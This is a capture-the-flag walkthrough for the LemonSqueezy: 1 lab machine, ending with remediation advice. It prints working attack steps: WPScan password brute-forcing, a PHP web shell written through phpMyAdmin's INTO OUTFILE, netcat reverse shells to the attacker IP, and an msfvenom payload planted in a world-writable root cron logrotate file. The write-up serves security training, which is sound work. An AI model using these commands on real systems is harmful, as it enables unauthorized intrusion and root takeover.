# LemonSqueezy: 1 — Writeup

| Field | Value |
|---|---|
| **Target IP** | 192.168.1.105 |
| **Attacker IP** | 192.168.1.112 (Kali Linux) |
| **Difficulty** | Easy |
| **OS** | Linux |
| **Goal** | `user.txt` + `root.txt` |
| **Source** | [HackingArticles](https://www.hackingarticles.in/lemonsqueezy1-vulnhub-walkthrough/) |

---

## Attack Summary

LemonSqueezy: 1 features a single exposed HTTP service running WordPress alongside phpMyAdmin. WPScan enumerates users, and a brute-force attack recovers the WordPress password. A second credential is found inside a WordPress post. That credential unlocks phpMyAdmin, where MySQL's `INTO OUTFILE` is used to write a web shell. From the resulting shell, a writable `/etc/logrotate.d/` config file that is executed by a root cron job every two minutes is leveraged for privilege escalation.

---

## Methodology

1. Port scan — only port 80 open
2. Directory enumeration reveals WordPress and phpMyAdmin
3. WPScan user enumeration and password brute-force
4. Second credential discovered in a WordPress post
5. phpMyAdmin SQL `INTO OUTFILE` web shell
6. Reverse shell and user flag
7. Privilege escalation via writable root-owned cron logrotate config

---

## Step 1: Reconnaissance

Identify the host with `netdiscover`, then scan:

```bash
nmap -A 192.168.1.105
```

**Open port:** 80 (HTTP only)

Add the target hostname to `/etc/hosts` if needed for WordPress to function correctly.

![Nmap scan](images/01-nmap.png)

---

## Step 2: Directory Enumeration

Brute-force web directories:

```bash
dirb http://192.168.1.105
```

**Found:**
- `/wordpress` — WordPress installation
- `/phpmyadmin` — phpMyAdmin panel

---

## Step 3: WordPress Enumeration and Brute-Force

Enumerate WordPress users:

```bash
wpscan --url http://192.168.1.105/wordpress -e u
```

**Users found:** `orange`, `lemon`

Brute-force the password for user `orange`:

```bash
wpscan --url http://192.168.1.105/wordpress \
  -U orange \
  -P /usr/share/wordlists/rockyou.txt
```

**Credentials:** `orange : ginger`

![WPScan enumeration and brute-force](images/02-wpscan.png)

---

## Step 4: Second Credential Discovery

Log into WordPress at `http://192.168.1.105/wordpress/wp-admin` as `orange:ginger`.

Navigate to **Posts** and open the draft/edit view of any existing post. A second credential is visible inside the post body:

**phpMyAdmin password:** `nOt1n@wOrdl1st!`

---

## Step 5: Web Shell via phpMyAdmin SQL Injection

Log into phpMyAdmin at `http://192.168.1.105/phpmyadmin` with:

- **Username:** `orange`
- **Password:** `nOt1n@wOrdl1st!`

Select the WordPress database and open the **SQL** query tab. Use MySQL's file-write capability to drop a PHP web shell into the WordPress document root:

```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/wordpress/backdoor.php";
```

Verify the shell:

```
http://192.168.1.105/wordpress/backdoor.php?cmd=whoami
```

Expected output: `www-data`

![phpMyAdmin shell creation](images/03-phpmyadmin-shell.png)

---

## Step 6: Reverse Shell

Start a listener on the attacker machine:

```bash
nc -lvnp 1234
```

Trigger a reverse shell through the web shell (URL-encode the payload):

```
http://192.168.1.105/wordpress/backdoor.php?cmd=nc+-e+/bin/bash+192.168.1.112+1234
```

Once the shell connects, upgrade to a TTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

Read the user flag:

```bash
cat ~/user.txt
```

---

## Step 7: Privilege Escalation — Writable Logrotate Config

Since `/tmp` may not be writable, use the web root for staging tools. Host `LinEnum.sh` on the attacker machine:

```bash
python3 -m http.server 8000
```

Download and run on the target:

```bash
cd /var/www/html/wordpress
wget http://192.168.1.112:8000/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh
```

Inspect the crontab:

```bash
cat /etc/crontab
```

A cron job runs logrotate every 2 minutes. Check the logrotate config directory:

```bash
ls -la /etc/logrotate.d/
```

The file `/etc/logrotate.d/logrotate` is **world-writable**. Overwrite it with a reverse shell payload. Generate one with msfvenom:

```bash
msfvenom -p cmd/unix/reverse_netcat LHOST=192.168.1.112 LPORT=4444 R
```

Write the output into the logrotate config file on the target:

```bash
echo '<msfvenom output>' > /etc/logrotate.d/logrotate
```

Start the listener:

```bash
nc -lvnp 4444
```

Wait up to 2 minutes for the cron job to execute the logrotate config as root.

![Logrotate cron escalation](images/04-logrotate.png)

---

## Step 8: Root Flag

After the root shell callback:

```bash
id
cd /root
ls
cat root.txt
```

![Root flag](images/05-root-flag.png)

---

## Lessons Learned

- WordPress installations must enforce strong passwords; `orange:ginger` is trivially brute-forced.
- Sensitive credentials must never be stored in CMS post drafts or content.
- `phpMyAdmin` should not be exposed on a public-facing web server; restrict to localhost or specific IPs.
- MySQL's `INTO OUTFILE` capability is dangerous when the database user has `FILE` privilege and the web root is writable; restrict file operations at the database level.
- Cron jobs that run as root must not operate on world-writable configuration files.

---

## Remediation

| Vulnerability | Fix |
|---|---|
| Weak WordPress password (`ginger`) | Enforce strong password policy; disable XML-RPC if unused |
| Credential in WordPress post | Never store secrets in CMS content; use a secrets manager |
| phpMyAdmin publicly accessible | Bind phpMyAdmin to `127.0.0.1`; restrict with firewall or auth gateway |
| MySQL `INTO OUTFILE` web shell | Revoke `FILE` privilege from the web app DB user |
| World-writable cron logrotate config | `chown root:root /etc/logrotate.d/*; chmod 644 /etc/logrotate.d/*` |
